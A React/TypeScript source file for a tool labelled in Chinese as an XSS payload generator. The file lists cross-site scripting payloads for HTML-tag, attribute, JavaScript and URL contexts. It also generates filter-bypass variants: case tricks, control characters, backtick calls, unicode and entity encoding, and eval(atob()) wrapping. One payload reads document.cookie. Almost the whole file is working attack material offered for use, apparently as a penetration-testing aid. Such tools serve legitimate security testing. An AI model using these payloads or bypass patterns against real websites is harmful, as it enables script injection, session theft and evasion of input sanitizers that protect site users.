import SimpleTool from '../../_shared/SimpleTool';
import type { ToolProps } from '../../types';

const CONTEXT_OPTIONS = [
  { value: 'html-tag', label: 'HTML标签' },
  { value: 'attribute', label: '属性值' },
  { value: 'js', label: 'JS上下文' },
  { value: 'url', label: 'URL上下文' },
];

const BYPASS_OPTIONS = [
  { value: 'none', label: '无绕过' },
  { value: 'no-script', label: '过滤script' },
  { value: 'no-event', label: '过滤事件' },
  { value: 'no-paren', label: '过滤括号' },
  { value: 'encoding', label: '编码绕过' },
];

const CONTEXT_BASE: Record<string, string[]> = {
  'html-tag': [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<iframe src=javascript:alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<details open ontoggle=alert(1)>',
    '<marquee onstart=alert(1)>',
    '<video src=x onerror=alert(1)>',
    '<svg><animate onbegin=alert(1)>',
  ],
  attribute: [
    '" onmouseover=alert(1) x="',
    "' onmouseover=alert(1) x='",
    '" autofocus onfocus=alert(1) x="',
    '"><script>alert(1)</script><x "',
    '" onclick=alert(1) x="',
    'javascript:alert(1)',
    '" onload=alert(1) x="',
    '"><img src=x onerror=alert(1)><x "',
  ],
  js: [
    "';alert(1);//",
    "';alert(1)//",
    '</script><script>alert(1)</script>',
    '-alert(1)-',
    ';alert(1)',
    '\\u0027;alert(1)//',
    '`${alert(1)}`',
    '*/alert(1)/*',
  ],
  url: [
    'javascript:alert(1)',
    'javascript://%0aalert(1)',
    'data:text/html,<script>alert(1)</script>',
    'javascript:alert(1)//',
    'javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>',
    'javascript:alert(document.cookie)',
  ],
};

const applyBypass = (payload: string, bypass: string): string[] => {
  switch (bypass) {
    case 'no-script':
      return [
        payload.replace(/script/gi, 'ScrIpt'),
        payload.replace(/script/gi, 'scri\x0bpt'),
        payload.replace(/<script/gi, '<svg'),
        payload.replace(/alert/gi, 'top.aler\\u0074'),
        payload.replace(/script/gi, '\\x73cript'),
      ];
    case 'no-event':
      return [
        payload.replace(/onerror/gi, 'onError'),
        payload.replace(/onerror/gi, 'on\\u0065rror'),
        payload.replace(/onload/gi, 'ONLOAD'),
        payload.replace(/onerror=/gi, 'onerror\t='),
        payload.replace(/onerror=/gi, 'onerror\n='),
      ];
    case 'no-paren':
      return [
        payload.replace(/alert\(1\)/g, 'alert`1`'),
        payload.replace(/alert\(1\)/g, 'throw`1`'),
        payload.replace(/alert\(1\)/g, 'alert(window[`x`])'),
        payload.replace(/alert\(1\)/g, 'top[`al`+`ert`](1)'),
      ];
    case 'encoding':
      return [
        encodeURIComponent(payload),
        payload.replace(/</g, '&#60;').replace(/>/g, '&#62;'),
        payload.replace(/alert/g, '\\u0061\\u006c\\u0065\\u0072\\u0074'),
        payload.replace(/</g, '\\x3c').replace(/>/g, '\\x3e'),
        `eval(atob('${btoa(payload)}'))`,
      ];
    default:
      return [];
  }
};

const generate = (context: string, bypass: string): string => {
  const base = CONTEXT_BASE[context] ?? CONTEXT_BASE['html-tag'];
  const lines: string[] = [
    `=== XSS Payload（Context: ${context} / Bypass: ${bypass}）===`,
    '',
    '--- 基础 Payload ---',
    ...base,
  ];
  if (bypass !== 'none') {
    lines.push('', `--- ${bypass} 绕过变体 ---`);
    base.slice(0, 5).forEach((p) => {
      lines.push(`[原始] ${p}`);
      applyBypass(p, bypass).forEach((v) => lines.push(`  ↳ ${v}`));
    });
  } else {
    lines.push('', '--- 通用绕过 Payload ---');
    lines.push('<img src=x onerror=alert(1)>');
    lines.push('<svg/onload=alert(1)>');
    lines.push('<img src=x:alert(alt) onerror=eval(src) alt=XSS>');
    lines.push('<iframe src="javascript:alert(1)">');
    lines.push('<a href="javascript:alert(1)">click</a>');
  }
  return lines.join('\n');
};

const ToolComponent = (props: ToolProps) => (
  <SimpleTool
    {...props}
    toolName="XSS Payload生成器"
    paramsConfig={[
      { name: 'context', label: '上下文', type: 'select', options: CONTEXT_OPTIONS, default: 'html-tag' },
      { name: 'bypass', label: '绕过策略', type: 'select', options: BYPASS_OPTIONS, default: 'none' },
    ]}
    execute={(
      _input: string,
      _mode: string,
      params: Record<string, unknown>,
    ): string => generate(
      (params.context as string) ?? 'html-tag',
      (params.bypass as string) ?? 'none',
    )}
  />
);

export default ToolComponent;
